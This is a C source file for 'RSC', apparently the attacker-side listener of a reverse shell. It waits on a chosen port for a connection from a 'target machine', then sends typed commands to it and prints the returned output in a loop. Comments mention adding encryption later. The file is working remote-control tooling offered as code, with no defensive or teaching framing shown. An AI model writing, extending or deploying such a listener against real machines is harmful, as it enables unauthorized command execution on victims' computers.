#include "headers/util.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Get the port when starting the program
int main(int argc, char *argv[]) {
	int port;
	if (argc < 2) {
		usage();
		return 0;
	}

	port = atoi(argv[1]);
	int s = setup_listener(port);

	shell(s);
	close(s);
	return 0;
}

void usage() {
	printf("ERROR running RSC!\nRun: rsc <listen port>\n");
}

int setup_listener(int port) {
	int sockfd, client_sock;
	struct sockaddr_in serv_addr, client_addr;
	socklen_t client_len = sizeof(client_addr);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		perror("Failed to initialize sockfd\n");
		exit(EXIT_FAILURE);
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(port);

	if (bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
		perror("Failed to bind the sockfd\n");
		exit(EXIT_FAILURE);
	}

	if (listen(sockfd, 1) == -1) {
		perror("Listening failed\n");
		exit(EXIT_FAILURE);
	}

	printf("| Waiting for incoming connection on port %d |\n", port);
	client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
	if (client_sock == -1) {
		perror("Error accepting connection\n");
		exit(EXIT_FAILURE);
	}

	printf("Connection successfully made from %s on \n", inet_ntoa(client_addr.sin_addr));

	return client_sock;
}

void shell(int sockfd) {
	// maybe not so memory efficient allocating that big of a buffer but whatever
	char command[1024];
	char output[8192];

	// first let's test out without actually encrypting anything
	while (1) {
		printf("rsc> ");
		fflush(stdout);

		// clean command var
		memset(command, 0, sizeof(command));

		// getting command
		fgets(command, sizeof(command), stdin); 

		send(sockfd, command, strlen(command), 0);

		if (strncmp(command, "exit", 4) == 0) {
			printf("Exiting shell now ...\n");
			break;
		}
		// not needing command variable after this point
		memset(command, 0, sizeof(command));

		// get output now
		memset(output, 0, sizeof(output)); // clear out the string for output

		while (1) {
			char outchunk[4096];
			memset(outchunk, 0, sizeof(outchunk));

			int bytes = recv(sockfd, outchunk, sizeof(outchunk), 0);
			if (bytes <= 0) {
				printf("Closing connection by target machine... \n");
				return; // to exit the program now also
			}

			// outchunk[bytes] = '\0';

			printf("Appending to output: %s\n", outchunk);
			strncat(output, outchunk, bytes); // combine the output

			// if (strstr(outchunk, "EOF!\n")) break;
			if (bytes < sizeof(outchunk) - 1) break;
		}
		

		printf("Gotten output: %s\n", output);
	}

	close(sockfd);
}
